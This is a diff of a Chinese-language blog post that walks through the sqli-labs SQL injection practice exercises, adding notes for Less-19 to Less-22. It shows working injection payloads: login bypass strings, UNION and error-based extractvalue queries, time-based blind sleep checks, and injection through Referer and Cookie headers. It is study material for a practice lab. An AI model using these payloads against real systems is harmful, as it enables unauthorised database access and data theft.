@@ -18,12 +18,12 @@ ga('send', 'pageview');
 
 
   
-  <title>sqli-labs | FINSENTY54</title>
+  <title>sqli-labs(less-1__less-22) | FINSENTY54</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="闭合有&amp;#39; &amp;quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;">
 <meta name="keywords" content="sql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs">
+<meta property="og:title" content="sqli-labs(less-1__less-22)">
 <meta property="og:url" content="http://finsenty54.github.io/2019/02/27/sqli-labs/index.html">
 <meta property="og:site_name" content="FINSENTY54">
 <meta property="og:description" content="闭合有&amp;#39; &amp;quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;">
@@ -47,9 +47,16 @@ ga('send', 'pageview');
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9JFUS.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9Nzi8.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/10/A9UGo6.png">
-<meta property="og:updated_time" content="2019-03-10T14:45:13.608Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACy1bD.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACyvqO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/AC6Kij.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/13/AkUjaj.th.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/13/AkU7xf.th.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/13/Akauz6.th.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/13/AkaQsO.th.png">
+<meta property="og:updated_time" content="2019-03-13T12:28:08.474Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs">
+<meta name="twitter:title" content="sqli-labs(less-1__less-22)">
 <meta name="twitter:description" content="闭合有&amp;#39; &amp;quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;">
 <meta name="twitter:image" content="https://s2.ax1x.com/2019/02/28/k7xiTg.png">
 <meta name="twitter:creator" content="@fin12138">
@@ -117,7 +124,7 @@ ga('send', 'pageview');
         
   
     <h1 class="article-title" itemprop="name">
-      sqli-labs
+      sqli-labs(less-1__less-22)
     </h1>
   
 
@@ -219,7 +226,9 @@ ga('send', 'pageview');
 <p>利用页面返回时间判断对错<br>例如<br><code>?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+</code></p>
 <hr>
 <h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>与上题相同，不过利用<code>&quot;</code>进行闭合</p>
-<h2 id="更新于2019-03-06-20-29-31-星期三"><a href="#更新于2019-03-06-20-29-31-星期三" class="headerlink" title="更新于2019-03-06 20:29:31 星期三"></a>更新于2019-03-06 20:29:31 星期三</h2><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - 从指定的资源请求数据。
+<p>更新于2019-03-06 20:29:31 星期三</p>
+<hr>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - 从指定的资源请求数据。
 POST - 向指定的资源提交要被处理的数据
 </code></pre><p>输入<code>&#39;</code>报错，知用<code>&#39;</code>闭合<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit</code><br>可以直接爆出来<br>其他相同<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit</code><br><a href="https://imgchr.com/i/A9VId1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9VId1.png" alt="A9VId1.png"></a></p>
 <hr>
@@ -246,6 +255,26 @@ POST - 向指定的资源提交要被处理的数据
 <p><code>1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9Nzi8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9Nzi8.png" alt="A9Nzi8.png"></a><br><code>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9UGo6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9UGo6.png" alt="A9UGo6.png"></a><br>其他相同<br><em>HTTP 请求头中除了 User-Agent可能存在sql注入意外，还有referer、X-Forwarded-For可能存在sql注入。</em></p>
 <p>更新于2019-03-10 22:43:03 星期日</p>
 <hr>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>参考上题<br>输入正确用户和密码后，跳出页面</p>
+<p><a href="https://imgchr.com/i/ACy1bD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/ACy1bD.png" alt="ACy1bD.png"></a></p>
+<p>差不多知道在<code>referer</code>上注入<br><code>&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1</code><br>不能用<code>#</code>注释，因为后面还有语句存在</p>
+<p><a href="https://imgchr.com/i/ACyvqO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/ACyvqO.png" alt="ACyvqO.png"></a></p>
+<p><code>&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1</code></p>
+<p><a href="https://imgchr.com/i/AC6Kij" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/AC6Kij.png" alt="AC6Kij.png"></a></p>
+<p>更新于2019-03-10 22:43:03 星期日</p>
+<hr>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>由题目知注入点在Cookie中</p>
+<p><em>这里我犯了个错误，由于没有拦截，修改Cookie后，直接点刷新不会出结果，需要重新载入页面</em></p>
+<p>输入<code>&#39;</code><br><a href="https://imgchr.com/i/AkUjaj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkUjaj.th.png" alt="AkUjaj.th.png"></a><br>报错存在注入点</p>
+<p>接下来可以用第一题用的<br><code>&#39; union select 1,2,database()#</code><br><a href="https://imgchr.com/i/AkU7xf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkU7xf.th.png" alt="AkU7xf.th.png"></a></p>
+<p><code>&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()#</code><br><a href="https://imgchr.com/i/Akauz6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/Akauz6.th.png" alt="Akauz6.th.png"></a></p>
+<p>也可以用报错注入<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code><br><a href="https://imgchr.com/i/AkaQsO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkaQsO.th.png" alt="AkaQsO.th.png"></a></p>
+<hr>
+<p>Less-21<br>查看Cookie<br><code>YWRtaW4</code>进行解密，知是用base64加密的<code>admin</code><br>所以只要将上题内容加密即可</p>
+<hr>
+<p>Less-22<br>查看cookie<br><code>admin&#39; and 1=1 #</code>没有查询结果<br><code>admin&quot; and 1=1 #</code>结果正确<br>知是用<code>&quot;</code>闭合<br>其他方法与前题相同</p>
+<p>更新于2019-03-13 20:26:48 星期三</p>
+<hr>
 
       
     </div>
@@ -253,7 +282,7 @@ POST - 向指定的资源提交要被处理的数据
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjt44bzfa0004ogw8mtw2n7kq" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjt76kw3z0004xkw8q2fv6b5o" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
@@ -336,7 +365,7 @@ gitment.render('git')
           </li>
         
           <li>
-            <a href="/2019/02/27/sqli-labs/">sqli-labs</a>
+            <a href="/2019/02/27/sqli-labs/">sqli-labs(less-1__less-22)</a>
           </li>
         
       </ul>
